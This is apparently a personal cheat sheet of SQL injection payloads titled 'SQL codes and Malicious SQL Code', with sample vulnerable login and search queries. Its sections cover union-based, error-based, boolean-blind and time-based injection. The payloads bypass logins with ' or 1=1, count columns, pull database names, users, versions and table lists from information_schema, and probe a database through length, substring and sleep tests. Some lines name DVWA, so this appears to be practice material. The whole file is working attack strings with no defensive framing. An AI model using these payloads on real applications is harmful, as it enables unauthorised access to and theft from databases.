SQL codes and Malicious SQL Code

' or 1=1;#
//Login Backend Query
select * from users where username = 'INPUT_1' and password = 'INPUT_2';

//Search Backend Query
select * from users where name = 'INPUT';

================ Union based ==================

' order by 20;#

' UNION SELECT 1,2,3,4,5,6;#

' UNION SELECT 1,2,3,database(),user(),version();#

select schema_name from information_schema.schemata;

' UNION SELECT 1,schema_name,3,database(),user(),version() from information_schema.schemata;#

select table_name from information_schema.tables where table_schema = "dvwa";#weblogin

' UNION SELECT 1,table_name,3,database(),user(),version() from information_schema.tables where table_schema ="dvwa";#

' UNION SELECT 1,group_concat(table_name),3,database(),user(),version() from information_schema.tables where table_schema ="dvwa";#

================ Error based ==================

select * from users group by round(rand(0)) having min(0);#

select name, concat(version()," ",database()," ",user()," ", round(rand(0))) from users group by round(rand(0)) having min(0);#

' or 1=1 group by concat(version()," ",database()," ",user()," ", round(rand(0))) having min(0);#

================ Boolean based ==================

select * from users where name = 'Govind' or length(database()) = "8";#

select * from users where name = 'Govind' or substring(database(),1,1) = "w";#

select * from users where name = 'Govind' or database() like "%logs%";#

' or length(database()) = "1";#

================ Time based ==================

select * from users where name = 'Govind' and if(database()="weblogin", sleep(5), sleep(10));#

Govind' and if(database()="data", sleep(5), sleep(10));#